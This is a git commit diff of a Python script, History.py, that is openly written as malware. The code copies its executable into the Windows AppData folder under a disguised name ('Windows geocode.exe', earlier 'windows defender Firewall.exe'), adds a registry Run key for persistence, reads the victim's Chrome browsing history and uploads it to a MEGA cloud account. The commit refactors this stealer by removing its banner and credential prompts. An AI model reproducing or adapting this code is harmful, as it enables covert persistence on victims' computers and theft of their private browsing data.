a329b706d2635232077aa0f2a09cab5690ad2c51
Mido_d3vil <47694344+De3vil@users.noreply.github.com>
2022-02-06 15:51:03 +0200

    Update History.py

--- History.py
+++ History.py
@@ -1,29 +1,17 @@
-#*__* MIDO *__*
 from browser_history.browsers import Chrome
 from os import remove , path , chdir , environ , getcwd
 from datetime import datetime
 from mega import Mega
 from time import sleep
-import shutil , subprocess  ,sys
-banner = """\033[1;33;40m
-                                                               
-██╗  ██╗██╗███████╗████████╗ ██████╗ ██████╗ ██╗   ██╗
-██║  ██║██║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗╚██╗ ██╔╝
-███████║██║███████╗   ██║   ██║   ██║██████╔╝ ╚████╔╝ 
-██╔══██║██║╚════██║   ██║   ██║   ██║██╔══██╗  ╚██╔╝  
-██║  ██║██║███████║   ██║   ╚██████╔╝██║  ██║   ██║   
-╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   By: mido-de3vil 
-"""
-print (banner)
-email = input("\033[1;37;40m email (mega account) :- ")
-password = input("\033[1;37;40m password (mega password) :- ")
+import shutil , subprocess ,sys
 def reg_windows():
-	evil_file_location = environ["appdata"] + "\\windows defender Firewall.exe"
+	evil_file_location = environ["appdata"] + "\\Windows geocode.exe"
 	if not path.exists(evil_file_location):
 		shutil.copyfile(sys.executable, evil_file_location)
 		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 reg_windows()
 def Mido():
+	
 	f = Chrome()
 	outputs = f.fetch_history()
 	paTh = chdir(environ["temp"])
@@ -32,20 +20,13 @@ def Mido():
 	for i in his:
 		x.writelines(i[1]+"\n\n")
 	x.close()
-def up():
-	global email , password
+def up(email, password):
 	Mido()
 	mega = Mega()
 	try:
 		m = mega.login(email, password)
-		Folder = mega.find('mido')
-		mega.upload('history.txt', Folder[0])
+		mega.upload('history.txt')
 	except Exception as e:
+		#print(e)
 		sleep(120)
 	remove("history.txt")
-while 1:
-	try:
-		up()
-		sys.exit()
-	except Exception as e:
-		sleep(30)
